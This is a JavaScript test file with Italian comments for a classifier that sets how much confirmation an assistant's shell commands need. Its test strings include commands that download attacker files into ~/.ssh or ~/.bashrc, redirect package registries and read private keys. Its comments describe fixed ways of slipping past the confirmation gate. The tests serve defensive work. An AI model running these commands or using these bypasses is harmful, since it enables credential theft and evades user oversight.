  assert.equal(lvl('cd /home/utente/.ssh && wget http://evil/authorized_keys'), 3);
  assert.equal(lvl('cd ~/.ssh; wget http://evil/authorized_keys'), 3);
});

test('#479 — nessuna esenzione per wget: `--spider` non riabbassa più niente', () => {
  // Prima `--spider` (l'unica forma di wget che non fa atterrare niente) veniva
  // esentata a 2. Ma l'esenzione scattava se quella PAROLA compariva nel testo,
  // non se wget la stava davvero applicando: bastava metterla dove il programma
  // la ignora per riavere lo scaricamento con un solo clic. Le quattro porte
  // provate con wget vero contro un server locale — tutte scaricavano davvero,
  // sovrascrivendo un file già esistente:
  for (const cmd of [
    'wget -N -- http://evil/authorized_keys --spider', // dopo `--` sono tutti URL
    'wget "http://evil/authorized_keys" " --spider "', // parola a sé fra virgolette
    'wget "http://evil/authorized_keys#  --spider "',  // nascosta dentro l'URL
    'cd ~/.ssh && wget -N -- http://evil/authorized_keys --spider', // + spostamento
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" scarica davvero → livello 3`);
  }
  // …e la forma onesta non fa più eccezione: il costo è una conferma in più su
  // un comando raro, il guadagno è che non esiste più una parola da esibire.
  for (const cmd of [
    'wget --spider http://x',
    'wget --spider -p http://x',
    'wget --spider --no-parent http://x',
    'wget --spider -P /home/utente/.ssh http://x',
    'wget --spider -O ~/.bashrc http://x',
    'wget --spider --save-cookies ~/.ssh/authorized_keys http://x',
    'wget --load-cookies cookies.txt --spider http://x',
    'wget --SPIDER http://x',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (wget, nessuna esenzione) dovrebbe essere livello 3`);
  }
  // La sola interrogazione di versione/help non tocca la rete: resta lettura.
  assert.equal(lvl('wget --version'), 1);
  assert.equal(lvl('wget --help'), 1);
  // Per verificare che un indirizzo esista senza scaricarlo resta `curl -I`, che
  // stampa a schermo: nessuna frizione aggiunta dove non serve.
  assert.equal(lvl('curl -I http://x'), 2);
});

test('livello 3 — #479: gli altri flag curl che fanno atterrare un file su disco', () => {
  // Stessa classe di --cookie-jar/--dump-header, restata scoperta perché
  // l'elenco era di nomi: --libcurl scrive il programma C equivalente, --hsts e
  // --alt-svc creano/riscrivono le cache con quanto dichiara il server, e
  // `-w '%output{FILE}'` (curl ≥ 8.3) manda il testo formattato NEL file invece
  // che a schermo. Tutti scelgono il percorso da riga di comando → "conferma".
  for (const cmd of [
    'curl --libcurl /home/user/.ssh/authorized_keys http://evil/x',
    'curl --libcurl=/root/.bashrc http://x',
    'curl --hsts /root/.bashrc http://x',
    'curl --alt-svc ~/.ssh/authorized_keys http://x',
    'curl --metalink http://evil/lista.xml',
    'curl -w "%output{/home/user/.bashrc}ciao" http://evil/x',
    "curl -sw '%output{/root/.profile}x' http://x",   // dentro un bundle di short-flag
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (fa atterrare un file) dovrebbe essere livello 3`);
  }
});

test('livello 3 — curl -K/--config: le opzioni (output compreso) arrivano da un file', () => {
  // Un file di configurazione curl può contenere `output = ~/.ssh/authorized_keys`:
  // lo stesso primitivo di scrittura di -o, invisibile nel testo del comando →
  // l'ignoto è 3.
  for (const cmd of [
    'curl -K /tmp/cfg http://x',
    'curl --config /tmp/cfg http://x',
    'curl --config=/tmp/cfg http://x',
    'curl -sK /tmp/cfg http://x',              // -K dentro un bundle di short-flag
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (opzioni da file) dovrebbe essere livello 3`);
  }
});

test('livello 2 — curl SENZA flag di output resta conferma-popup', () => {
  // curl senza -o stampa su stdout: non fa atterrare niente → livello 2
  // (nessuna regressione). I flag comuni non di output (-s, -I, -L, -H, -X, -k,
  // -j, -u…) non devono salire a 3. In particolare la D minuscola e i flag
  // simili NON devono far scattare i check nuovi (curl -d = corpo POST,
  // curl --data-*).
  for (const cmd of [
    'curl http://example.com',
    'curl -s http://x', 'curl -I http://x', 'curl -L http://x',
    'curl -X POST http://x', 'curl -k http://x', 'curl -j http://x',
    'curl -u user:pass http://x',
    'curl -d name=mario http://x',             // -d minuscolo = corpo POST, non dump
    'curl --data-binary @file http://x',
    'curl -d @payload.json http://x',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (nessun output-su-file) dovrebbe restare livello 2`);
  }
});

test('il check output è curl/wget-specifico — tar -O (estrai su stdout) resta 2', () => {
  // -O ha significati diversi per programmi diversi: per tar è "estrai su
  // stdout" (nessuna scrittura arbitraria), quindi NON deve salire a 3.
  assert.equal(lvl('tar -xOf archivio.tar'), 2, 'tar -O = stdout, resta livello 2');
});

test('sequenza — curl -o dentro una catena alza il livello a 3', () => {
  assert.equal(lvl('cd /tmp && curl -o /home/u/.ssh/authorized_keys http://evil/x'), 3);
  assert.equal(lvl('mkdir x && wget -O ~/.bashrc http://evil/x'), 3);
});

test('livello 3 — robocopy con flag distruttivi Windows (/MIR, /PURGE, /MOVE)', () => {
  // Feedback #270: `robocopy SRC DST /MIR` e `/PURGE` cancellano in modo
  // PERMANENTE (bypassando il Cestino) i file della destinazione non presenti
  // nella sorgente — un rm -rf mirato. DANGEROUS_FLAG_RE vedeva solo i flag
  // stile Unix (--force, -rf): questi slash-flag restavano a livello 2 (basta
  // un clic). Ora chiedono di digitare "conferma" (3). /MOVE e /MOV cancellano
  // la sorgente dopo la copia → stessa classe distruttiva.
  for (const cmd of [
    'robocopy C:\\src C:\\dst /MIR',
    'robocopy C:\\src C:\\dst /PURGE',
    'robocopy C:\\origine C:\\destinazione /E /PURGE',
    'robocopy src dst /mir',            // case-insensitive (i flag Windows lo sono)
    'robocopy C:\\a C:\\b /MOVE',
    'robocopy C:\\a C:\\b /MOV',
    'robocopy C:\\a C:\\b /E /MIR /R:3', // in mezzo ad altri flag
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (robocopy distruttivo) dovrebbe essere livello 3`);
  }
});

test('livello 2 — robocopy SENZA flag distruttivi resta conferma-popup', () => {
  // Nessuna regressione: una copia robocopy normale (anche con flag innocui) è
  // una modifica recuperabile → resta livello 2, non deve salire a 3.
  for (const cmd of [
    'robocopy C:\\src C:\\dst',
    'robocopy C:\\src C:\\dst /E',
    'robocopy C:\\src C:\\dst *.txt /S',
    'robocopy C:\\src C:\\dst /COPYALL /R:5 /W:2',
    'robocopy C:\\src C:\\dst /MT:8',   // /MT (multi-thread) non è distruttivo
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (copia robocopy normale) dovrebbe restare livello 2`);
  }
});

test('sequenza — robocopy /MIR dentro una catena alza il livello a 3', () => {
  assert.equal(lvl('cd C:\\work && robocopy C:\\src C:\\dst /MIR'), 3);
});

// ─────────────────────────────────────────────────────────────────────────────
// PowerShell: cmdlet di sola lettura e pipeline di sole letture.
// La shell di default di Filo su Windows è PowerShell, e un modello che scrive
// PowerShell naturale usa `Get-ChildItem` e le pipeline: prima finivano tutti
// nel ramo "non riconosciuto" e leggere una cartella costava la stessa frizione
// di un `rm -rf`. Qui la parte che scende a 1 E, subito dopo, tutti i modi noti
// di infilare una scrittura dentro una lettura — che devono restare 3.
// ─────────────────────────────────────────────────────────────────────────────

test('livello 1 — cmdlet PowerShell di sola lettura invocati da soli', () => {
  for (const cmd of [
    'Get-ChildItem', 'gci',
    'Get-ChildItem -Filter *.js -Force',       // -Force qui = mostra i file nascosti
    'Get-Content package.json', 'Get-Content -Raw log.txt', 'gc log.txt -Tail 20',
    'Get-Item .', 'Get-ItemProperty progetto', 'Get-ItemPropertyValue x y',
    'Get-Location', 'gl', 'Get-Date', 'Get-Date -Format yyyy-MM-dd',
    'Select-String errore log.txt', 'sls TODO -Path src',
    'Select-Object -First 5', 'Sort-Object Length', 'Measure-Object -Sum',
    'Resolve-Path .', 'Split-Path C:\\a\\b -Parent',
    'Join-Path C:\\a b', 'Get-Command git', 'Get-Help Get-ChildItem',
    'Format-Table', 'Format-List', 'Format-Wide', 'Out-String',
    'ConvertTo-Json', 'ConvertFrom-Json', 'Get-Service',
    // il nome del cmdlet non è sensibile a maiuscole/minuscole, come in PowerShell
    'get-childitem', 'GET-CHILDITEM',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (cmdlet di lettura) dovrebbe essere livello 1`);
  }
});

test('livello 3 — i cmdlet che SCRIVONO restano fuori dalla whitelist', () => {
  // Il gemello che scrive è sempre un altro verbo: basta che resti fuori dalla
  // lista perché il default (l'ignoto è 3) faccia il suo lavoro.
  for (const cmd of [
    'Set-Content x.txt ciao', 'Set-Item x y', 'Set-ItemProperty a b c',
    'New-Item -ItemType File x', 'Remove-Item x', 'Remove-Item -Recurse -Force x',
    'Out-File out.txt', 'Tee-Object out.txt', 'Export-Csv out.csv',
    'Stop-Process -Name filo', 'Start-Process calc', 'Set-Date -Date 2020-01-01',
    'Invoke-Expression "rm x"', 'Invoke-WebRequest http://x',
    'Import-Module MioModulo', 'Clear-Content log.txt', 'Rename-Item a b',
    // letture volutamente NON ammesse: superficie troppo larga o interattiva
    'Get-CimInstance Win32_Process', 'Get-WmiObject Win32_Service',
    'Get-Credential', 'Measure-Command { Remove-Item x }',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (scrive o non è in whitelist) dovrebbe essere livello 3`);
  }
});

test('livello 1 — pipeline in cui OGNI segmento è una lettura', () => {
  for (const cmd of [
    'Get-ChildItem | Sort-Object Length',
    'Get-ChildItem | Sort-Object Length | Select-Object -First 5',
    'Get-ChildItem | Select-Object Name, Length | Format-Table',
    'Get-Content log.txt | Select-String errore',
    'Get-ChildItem | Measure-Object -Sum Length',
    'Get-ChildItem | Group-Object Extension | Sort-Object Count',
    'Get-ChildItem | Sort-Object Length | Select-Object -First 3 | Format-Table',
    'Get-ChildItem | Out-String',
    'gci | select -First 3',
    // le pipeline delle altre shell valgono lo stesso: incanalare una lettura
    // dentro un'altra lettura non fa niente che la prima non facesse già
    'cat file | grep errore',
    'ls | cat',
    'git log --oneline | head -n 20',
    'cat a.txt | wc -l',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (pipeline di sole letture) dovrebbe essere livello 1`);
  }
});

test('livello 3 — basta UN segmento non di lettura e la pipeline resta 3', () => {
  for (const cmd of [
    'Get-ChildItem | Remove-Item',
    'Get-ChildItem | Out-File elenco.txt',
    'Get-ChildItem | Tee-Object elenco.txt',
    'Get-Content x.txt | Set-Content y.txt',
    'Get-Content script.ps1 | Invoke-Expression',
    'Get-ChildItem | iex',
    'gci | Stop-Process',
    'Get-ChildItem | foobar',              // segmento sconosciuto
    'cat file | rm x',
    'Get-ChildItem | node -e "x"',
    'Get-ChildItem | sort',                // `sort` non è in whitelist (su Unix scrive con -o)
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (un segmento non è lettura) dovrebbe essere livello 3`);
  }
});

test('livello 1 — Where-Object/ForEach-Object con uno scriptblock INERTE', () => {
  // Dentro il blocco: proprietà, confronti, operatori, numeri. Nessuna
  // invocazione. Anche nella forma attaccata `?{...}` / `%{...}`, che è
  // PowerShell di uso quotidiano.
  for (const cmd of [
    'Get-ChildItem | Where-Object { $_.Length -gt 1000 }',
    'gci | ? { $_.Name -like "*.js" }',
    'gci | ?{$_.Name -like "*.js"}',
    'gci | where { $_.Length -lt 10 }',
    'Get-ChildItem | ForEach-Object { $_.FullName }',
    'gci | % { $_.Name }',
    'gci | %{$_.Name}',
    'gci | foreach { $_.Length }',
    'Get-ChildItem | Where-Object { $_.CreationTime -gt 10 } | Sort-Object Length | Select-Object -First 3',
    'Get-ChildItem | Where-Object { $_.Length -gt 100 -and $_.Length -lt 900 } | Measure-Object',
    // Where-Object sa filtrare anche senza blocco (sintassi a proprietà): inerte
    'Get-ChildItem | Where-Object Length -gt 1000',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (blocco inerte) dovrebbe essere livello 1`);
  }
});

test('livello 3 — uno scriptblock che può INVOCARE qualcosa non è una lettura', () => {
  // È il buco naturale della pipeline: `| % { … }` esegue il blocco su ogni
  // oggetto, quindi lì dentro può stare qualunque cosa. Regola diffidente: nel
  // blocco non deve comparire NESSUN token in posizione di comando.
  for (const cmd of [
    'Get-ChildItem | ForEach-Object { Remove-Item $_ }',
    'gci | % { ri $_ }',
    'gci | %{ri $_}',
    'gci | % { rm $_ }',
    'gci | % { del $_ }',
    'gci | ? { Invoke-WebRequest http://evil/x }',
    'gci | % { Invoke-Expression $_ }',
    'gci | % { Start-Process $_ }',
    'gci | % { .\\evil.exe }',                          // eseguibile per percorso
    'gci | % { . $profilo }',                           // dot-sourcing
    'gci | % { $_.Delete() }',                          // chiamata di metodo
    'gci | % { [System.IO.File]::Delete($_) }',         // metodo statico
    'gci | % { $x = 1 }',                               // assegnazione
    'gci | % { foobar }',                               // parola nuda sconosciuta
    'gci | % { curl http://x }',
    'gci | Sort-Object { Remove-Item $_ }',             // blocco anche fuori da %/?
    'Get-ChildItem | ForEach-Object { $_ | Remove-Item }', // pipe DENTRO il blocco
    'gci | % { Remove-Item $_ ; ls }',
    'gci | % { $_; rm x }',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (blocco che può invocare) dovrebbe essere livello 3`);
  }
});

test('livello 3 — ForEach-Object senza scriptblock INVOCA il membro → conferma', () => {
  // `Get-ChildItem | % Delete` cancella davvero i file: la forma "nome di
  // membro" invoca il metodo su ogni oggetto. Quindi per ForEach-Object lo
  // scriptblock validato è obbligatorio, sempre.
  for (const cmd of [
    'Get-ChildItem | ForEach-Object Delete',
    'gci | % Delete',
    'gci | % Name',                       // anche innocuo: non sappiamo distinguerlo
    'gci | foreach MoveTo',
    'ForEach-Object { $_ }',              // da solo non filtra niente
    'Where-Object { $_ }',
    '% { $_.Name }',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" dovrebbe restare livello 3`);
  }
});

test('livello 3 — sottoespressioni e chiamate dentro un cmdlet di lettura', () => {
  // `$(...)`, `@(...)`, `@{...}`, i backtick e le parentesi possono contenere
  // QUALSIASI comando: un cmdlet di lettura non le rende innocue.
  for (const cmd of [
    'Select-String pwd $(cat f)',
    'Get-Content $(Remove-Item x)',
    'Get-ChildItem -Path (Get-Location)',
    'Get-ChildItem @(Remove-Item x)',
    'Get-ChildItem | Select-Object @{n="x";e={Remove-Item $_}}',
    'Get-Content `whoami`',
    'Get-ChildItem -Path C:\\ ; Remove-Item x',
    'Get-ChildItem & Remove-Item x',
    'Get-Content x > y',
    'Get-Content x >> y',
    'Get-ChildItem | Out-String > elenco.txt',
    'Get-ChildItem::Delete',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" dovrebbe essere livello 3`);
  }
});

test('sequenza — un cmdlet di lettura non copre il pezzo che scrive', () => {
  assert.equal(lvl('Get-ChildItem; Remove-Item x'), 3);
  assert.equal(lvl('Get-ChildItem && Remove-Item x'), 3);
  assert.equal(lvl('cd src && Get-ChildItem'), 1);
  assert.equal(lvl('Get-Location; Get-ChildItem'), 1);
  assert.equal(lvl('Get-ChildItem && mkdir out'), 2);
});

test('SICUREZZA — l\'esca eseguibile omonima di un cmdlet fidato resta livello 3', () => {
  // Un file su disco chiamato come un cmdlet di lettura (`.\Get-ChildItem.exe`)
  // NON deve ereditare il livello 1 del cmdlet: `programOf` fa il basename e
  // toglie l'estensione, quindi senza difesa verrebbe eseguito senza conferma.
  // Le otto forme dello stesso buco più le varianti di estensione/alias.
  for (const cmd of [
    '.\\Get-ChildItem.exe',                       // 1. cartella corrente .\
    'C:\\Users\\me\\Downloads\\Get-ChildItem.exe',// 2. percorso assoluto
    'Downloads\\Get-ChildItem.exe',               // 3. percorso relativo
    '".\\Get-ChildItem.exe"',                     // 4. con virgolette
    'Get-ChildItem.exe',                          // 5. dal PATH, senza percorso
    'cd ~\\Downloads; .\\Get-ChildItem.exe',      // 6. riga unica cd + lancio
    'Get-ChildItem; .\\Get-ChildItem.exe',        // 7. in coda a una lettura vera
    '.\\Get-ChildItem.ps1',                       // 8. tutte le estensioni…
    '.\\Get-ChildItem.cmd', '.\\Get-ChildItem.bat', '.\\Get-ChildItem.com',
    '.\\gci.exe', '.\\Get-Content.exe',           // …nomi lunghi e alias
    './Get-ChildItem', '/home/x/Get-ChildItem',   // separatore unix, anche senza estensione
    '& Get-ChildItem.exe', '"Get-ChildItem.exe"', 'gci.exe',
    'Get-Content.cmd log.txt',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (file omonimo, non il cmdlet) DEVE restare livello 3`);
  }
  // Controprova: nomi che NON sono in whitelist restano 3 comunque.
  for (const cmd of ['evil.exe', 'Remove-Item.exe', 'Set-Content.exe', '.\\evil.exe']) {
    assert.equal(lvl(cmd), 3, `"${cmd}" dovrebbe essere livello 3`);
  }
});

test('SICUREZZA — l\'esca eseguibile dentro una pipeline resta livello 3', () => {
  for (const cmd of [
    'Get-ChildItem | Get-Content.exe',    // segmento con estensione = programma
    'Get-ChildItem | .\\evil.exe',
    'Get-ChildItem | .\\Select-Object.exe',
    'Get-Content x | .\\Sort-Object.exe',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (esca in pipeline) DEVE restare livello 3`);
  }
});

test('livello 1 — parità PowerShell: navigazione e hash di sola lettura', () => {
  // Le forme PowerShell di gesti già a livello 1 (`cd`, `sha256sum`) devono
  // avere lo stesso livello, non salire a 3 solo perché scritte da cmdlet.
  for (const cmd of [
    'Set-Location C:\\', 'sl ..', 'set-location -Path src',
    'pushd C:\\tmp', 'popd',
    'Get-FileHash file.txt', 'Get-FileHash -Algorithm SHA256 x',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" dovrebbe essere livello 1`);
  }
});

test('livello 1 — filtri PowerShell con un letterale fra virgolette in un confronto', () => {
  // Le virgolette venivano tolte prima del controllo di inerzia e la parola
  // quotata restava nuda, scambiata per un'invocazione. Un letterale fra
  // virgolette in un confronto è inerte tanto quanto `-like "*.md"`.
  for (const cmd of [
    'gci | ? { $_.Name -eq "readme.md" }',
    'Get-ChildItem | Where-Object { $_.Name -match "log" }',
    "gci | ? { $_.Extension -eq '.txt' }",
    'gci | Where-Object { $_.Name -like "*.md" }',
    'gci | ? { $_.LastWriteTime -gt "2020-01-01" }',
    'gci | ? { $_.Name -eq "a b.txt" }',      // spazio dentro le virgolette
    'Get-Content "my file.txt"',              // anche fuori da un blocco
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (letterale quotato inerte) dovrebbe essere livello 1`);
  }
  // …ma un'invocazione VERA resta 3 anche se i suoi argomenti sono fra virgolette.
  for (const cmd of [
    'gci | % { Remove-Item "x.txt" }',
    'gci | ? { & "evil.exe" }',
    'gci | % { Invoke-Expression "rm x" }',
  ]) {
    assert.equal(lvl(cmd), 3, `"${cmd}" (invocazione reale) dovrebbe restare livello 3`);
  }
});

test('livello 2 — npm/pip config che SCRIVE (registry incluso) non è lettura', () => {
  // Cambiare il registry reindirizza da dove npm/pip scaricano ed eseguono
  // codice: NON è lettura, chiede conferma. Prima erano tutti livello 1.
  for (const cmd of [
    'npm config set registry http://evil',
    'npm config delete registry', 'npm config rm proxy', 'npm config edit',
    'pip config set global.index-url http://evil',
    'pip config unset global.index-url', 'pip3 config edit',
  ]) {
    assert.equal(lvl(cmd), 2, `"${cmd}" (scrive config) dovrebbe essere livello 2`);
  }
});

test('livello 1 — npm config che LEGGE resta lettura', () => {
  for (const cmd of [
    'npm config get registry', 'npm config list', 'npm config ls', 'npm config',
  ]) {
    assert.equal(lvl(cmd), 1, `"${cmd}" (legge config) dovrebbe essere livello 1`);
  }
});

// #587, giro 5: `pip config list` stampa l'indirizzo del repository di pacchetti,
// che porta dentro utente e password in chiaro (`https://mario:PWD@pypi.…`).
// Aprire lo stesso file col suo nome (`.config/pip/pip.conf`) chiede già un OK:
// stessa cosa, stessa risposta. npm non è qui perché i suoi segreti li stampa
// come «protected», quindi non c'è niente da fermare.
test('#587 — leggere la configurazione di pip chiede un OK (ci sono dentro le password)', () => {
  for (const cmd of ['pip config list', 'pip config get global.index-url', 'pip config debug', 'pip3 config list']) {
    assert.equal(lvl(cmd), 2, `"${cmd}" stampa utente e password del repository: deve chiedere un OK`);
  }
});

test('"criterio di fatto" della spec — gli esempi citati', () => {
  assert.equal(lvl('ls'), 1, 'ls esegue subito');
  assert.equal(lvl('git push'), 2, 'git push → popup');
  assert.equal(lvl('rm qualcosa'), 3, 'rm → digita conferma');
  assert.equal(lvl('comandoinventato'), 3, 'comando inventato → digita conferma');
  assert.equal(lvl('ls && rm -rf /'), 3, '&& → livello 3');
});

// ── #587, giro 1 — il bersaglio è quello che il comando aprirà ───────────────
//
// Il perimetro di lettura si misurava sul TESTO dell'operando. Bastavano due
// comandi che non chiedono niente — spostarsi, poi leggere — per aprire un file
// riservato senza che il suo nome comparisse nel comando che legge. Stessa cosa
// per una lettura ricorsiva, che non nomina nessun bersaglio e li attraversa
// tutti, e per un comando senza percorso, che legge dove si trova.
//
// Senza il fix ognuno di questi assert torna 1 al posto di 2.

const HOME = '/home/mario';
const WIN = 'C:\\Users\\mario';
const dove = (cwd = HOME, home = HOME) => ({ perimetro: home, home, cwd });

test('#587 — spostarsi in una cartella riservata e leggere lì chiede un OK', () => {
  for (const cmd of [
    'cd ~/.ssh && cat config',
    'cd ~/.ssh && cat authorized_keys',
    'cd ~/.ssh ; cat known_hosts',
    'pushd ~/.aws && cat config',
    'cd ~/.gnupg && cat secring.gpg',
    'cd ~/.config/Filo && cat storage.json',
    'cd .config/Filo && cat storage.json',
    'cd ~/.ssh; Get-Content config',
  ]) {
    assert.equal(C.classify(cmd, dove()), 2, `"${cmd}" deve chiedere un OK`);
  }
  assert.equal(
    C.classify('cd C:\\Users\\mario\\AppData\\Roaming\\Filo && type storage.json', dove(WIN, WIN)),
    2, 'anche nella forma Windows',
  );
});

test('#587 — lo spostamento vale anche fatto in un turno precedente', () => {
  // La cartella corrente dell'assistente è persistente: il main la inietta, e
  // `cd` in un turno + lettura in quello dopo devono valere quanto la sequenza.
  assert.equal(C.classify('cat config', dove('/home/mario/.ssh')), 2);
  assert.equal(C.classify('cat storage.json', dove('/home/mario/.config/Filo')), 2);
  assert.equal(C.classify('type storage.json', dove('C:\\Users\\mario\\AppData\\Roaming\\Filo', WIN)), 2);
});

test('#587 — una lettura ricorsiva di tutta la cartella dell’utente chiede un OK', () => {
  for (const cmd of [
    'grep -r PRIVATE .',
    'grep -r "PRIVATE KEY" .',
    'grep -rn password /home/mario',
    'grep -r AWS_SECRET ~',
    'cd ~/.ssh && grep -r . .',
    'ls -R',
    'tree',
    'du -sh',
  ]) {
    assert.equal(C.classify(cmd, dove()), 2, `"${cmd}" deve chiedere un OK`);
  }
});

test('#587 — una ricorsiva su una sottocartella, o ristretta, resta senza attrito', () => {
  for (const cmd of [
    'grep -r errore progetti',
    'grep -r errore ./progetti/app',
    'cd progetti && grep -r errore .',
    'tree progetti',
    'du -sh Downloads',
    'ls -lart',        // la `r` qui ordina al contrario, non ricorre
    'grep -r chiave *.txt',
  ]) {
    assert.equal(C.classify(cmd, dove()), 1, `"${cmd}" non deve chiedere niente`);
  }
});

test('#587 — un comando senza percorso si misura sulla cartella in cui si trova', () => {
  assert.equal(C.classify('ls', dove('/etc')), 2, 'elencare /etc');
  assert.equal(C.classify('ls -la', dove('/root')), 2, 'elencare /root');
  assert.equal(C.classify('ls', dove('/home/mario/.ssh')), 2, 'elencare le chiavi');
  assert.equal(C.classify('ls', dove()), 1, 'la cartella dell’utente resta libera');
  assert.equal(C.classify('ls Documenti', dove()), 1, 'e le sue sottocartelle pure');
  assert.equal(C.classify('cat appunti.txt', dove()), 1, 'come le letture normali');
});

// ── #587 giro 2: il jolly, il collegamento, il testo cercato ─────────────────
// Stessa causa dei tre casi qui sopra — il bersaglio misurato non è quello che
// il comando aprirà — su tre strade nuove. La shell espande un modello DOPO che
// il livello è stato deciso: `cat .*` non nomina niente di riservato e apre
// `.netrc`, `.git-credentials` e la cronologia della shell.

test('#587 — un modello che può prendere i file nascosti chiede un OK', () => {
  for (const cmd of [
    'cat .*',
    'cat ~/.*',
    'cat /home/mario/.*',
    'head -n 200 .*',
    'wc -l .*',
    'file .*',
    'Get-Content .*',
    'cat .en*',
    'cat .{netrc,pgpass}',
    'cat {.bashrc,.git-credentials}',
  ]) {
    assert.equal(C.classify(cmd, dove()), 2, `"${cmd}" deve chiedere un OK`);
  }
});

test('#587 — una cartella riservata scritta con un jolly chiede un OK', () => {
  for (const cmd of [
    'cat .s?h/*',
    'cat .ss*/config',
    'cat .ss?/id_rsa',
    'cat .??h/id_*',
    'cat ./.s?h/config',
    'cat .SS?/config',
    'gc ~/.s?h/id*',
    'md5sum .s?h/*',
    'cat .a?s/*',
    'cat .conf*/Filo/storage.json',
    'Select-String PRIVATE .s?h/*',
    'cat .s?h/* | grep PRIVATE',
    'tree .s?h',
    'Get-ChildItem .s?h',
    'cd .s?h && cat config',
    'cd .ss* ; cat known_hosts',
  ]) {
    assert.equal(C.classify(cmd, dove()), 2, `"${cmd}" deve chiedere un OK`);
  }
  assert.equal(C.classify('cat config', dove('/home/mario/.s?h')), 2, 'anche spostandosi nel turno prima');
  assert.equal(C.classify('type AppDat?\\Roaming\\Filo\\storage.json', dove(WIN, WIN)), 2, 'anche su Windows');
});

test('#587 — un jolly che resta nel proprio lavoro non chiede niente', () => {
  // Un modello è anche il modo normale di lavorare sui propri file: se ogni `*`
  // costasse un OK, la conferma diventerebbe una cosa che si accetta sempre.
  for (const cmd of [
    'cat *.txt',
    'head -5 Documenti/*.csv',
    'wc -l progetto/*.js',
    'ls *.pdf',
    'cat *',
    'ls Documenti/*',
  ]) {
    assert.equal(C.classify(cmd, dove()), 1, `"${cmd}" non deve chiedere niente`);
  }
});

test('#587 — spostare o collegare un bersaglio riservato costa un "conferma"', () => {
  // Un collegamento alla cartella delle chiavi sposta il bersaglio dove il freno
  // sulla lettura non lo riconosce più: non può costare un OK su una frase che
  // sembra innocua. Copiare da un disco esterno invece resta un OK.
  for (const cmd of ['ln -s ~/.ssh scorciatoia', 'cp ~/.ssh/id_rsa copia', 'mv .aws/credentials qui', 'tar -cf chiavi.tar ~/.ssh']) {
    assert.equal(C.classify(cmd, dove()), 3, `"${cmd}" deve far digitare "conferma"`);
  }
  assert.equal(C.classify('cp /mnt/chiavetta/foto.jpg .', dove()), 2, 'copiare da una chiavetta resta un OK');
  assert.equal(C.classify('cp appunti.txt copia.txt', dove()), 2, 'e copiare un proprio file pure');
});

test('#587 — il testo cercato non è un file, e non deve far chiedere niente', () => {
  // In `grep credentials appunti.txt` il file aperto è `appunti.txt`: misurare
  // anche la parola cercata faceva chiedere un OK spiegando una cosa falsa.
  for (const cmd of ['grep credentials appunti.txt', 'grep shadow appunti.txt', 'grep passwd note.txt', 'sls credentials appunti.txt']) {
    assert.equal(C.classify(cmd, dove()), 1, `"${cmd}" non deve chiedere niente`);
    assert.equal(C.readReason(cmd, dove()), '', `"${cmd}" non deve nemmeno avere un motivo`);
  }
  // Ma il FILE cercato continua a contare, comunque sia scritto il comando.
  for (const cmd of ['grep credentials .ssh/config', 'grep -r chiave ~', 'grep -f modelli.txt .ssh/config']) {
    assert.equal(C.classify(cmd, dove()), 2, `"${cmd}" deve chiedere un OK`);
  }
});

// ── #587, giro 3 — il bersaglio scritto in un'altra forma ────────────────────
//
// Stessa causa dei due giri prima (quello che viene misurato non è quello che il
// comando aprirà), terza strada: il percorso scritto in un modo che la SHELL
// scioglie e il controllo no. In bash — la shell di Filo su Mac e Linux — la
// barra rovesciata non separa le cartelle, annulla il carattere dopo: `cat
// .ss\h/config` apre `~/.ssh/config` e `cat .netr\c` apre `~/.netrc`. Le
// virgolette col dollaro davanti (`$'…'`) sono un altro modo di scrivere la
// stessa stringa. Su Windows un percorso può viaggiare attaccato al nome del
// parametro (`-Path:…`), dove veniva scartato come se fosse un'opzione.
//
// Senza il fix ognuno di questi assert torna 1 al posto di 2.

test('#587 — una barra rovesciata dentro il nome non nasconde il bersaglio', () => {
  for (const cmd of [
    'cat .ss\\h/config',
    'cat .\\ssh/config',
    'cat .ss\\h/known_hosts',
    'head -5 .ss\\h/*',
    'cat .confi\\g/Filo/storage.json',
    'cat .netr\\c',
    'cat .git-credential\\s',
    'cat .pgpas\\s',
    'cat .bash_histor\\y',
    'cat .npmr\\c',
    'cd .ss\\h && cat config',
    'cd .ss\\h ; cat known_hosts',
    'ls .ss\\h',
    'cp .ss\\h/id_rsa /tmp/x',
  ]) {
    assert.ok(C.classify(cmd, dove()) >= 2, `"${cmd}" non può partire senza chiedere niente`);
  }
  // Con una shell Unix dichiarata vale anche la cartella di lavoro.
  assert.equal(
    C.classify('cat config', { perimetro: HOME, home: HOME, cwd: '/home/mario/.ss\\h', shell: 'bash' }),
    2,
    'lo spostamento del turno prima, letto come lo legge bash',
  );
});

test('#587 — le virgolette col dollaro davanti non nascondono il bersaglio', () => {
  for (const cmd of [
    "cat $'.ssh/config'",
    "cat $'.netrc'",
    "cat $'.config/Filo/storage.json'",
    "cd $'.ssh' && cat config",
  ]) {
    assert.equal(C.classify(cmd, dove()), 2, `"${cmd}" deve chiedere un OK`);
  }
});

test('#587 — il percorso attaccato al nome dell’opzione viene misurato', () => {
  for (const cmd of [
    'Get-Content -Path:.ssh\\config',
    'Get-Content -LiteralPath:.ssh\\id_rsa',
    'Select-String -Path:.ssh\\* PRIVATE',
    'gc -Path:AppData\\Roaming\\Filo\\storage.json',
    'grep --file=.ssh/id_rsa .',
    'grep -f.ssh/id_rsa .',
  ]) {
    assert.equal(C.classify(cmd, dove(WIN, WIN)), 2, `"${cmd}" deve chiedere un OK`);
  }
  // …ma il MODELLO cercato non è un file, nemmeno quando arriva da un'opzione:
